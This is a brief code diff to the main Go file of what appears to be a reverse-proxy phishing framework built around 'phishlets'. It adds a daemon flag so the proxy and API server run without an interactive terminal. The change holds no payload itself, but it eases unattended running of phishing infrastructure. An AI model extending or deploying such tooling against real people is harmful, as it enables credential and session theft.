@@ -25,6 +25,7 @@ var phishlets_dir = flag.String("p", "", "Phishlets directory path")
 var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
 var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
+var daemon_mode = flag.Bool("daemon", false, "Run in daemon mode without interactive terminal")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
 
@@ -191,11 +192,15 @@ func main() {
 		}
 	}()
 
-	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
-	if err != nil {
-		log.Fatal("%v", err)
-		return
+	if !*daemon_mode {
+		t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
+		if err != nil {
+			log.Fatal("%v", err)
+			return
+		}
+		t.DoWork()
+	} else {
+		log.Info("Running in daemon mode - API server and proxy are active")
+		select {}
 	}
-
-	t.DoWork()
 }
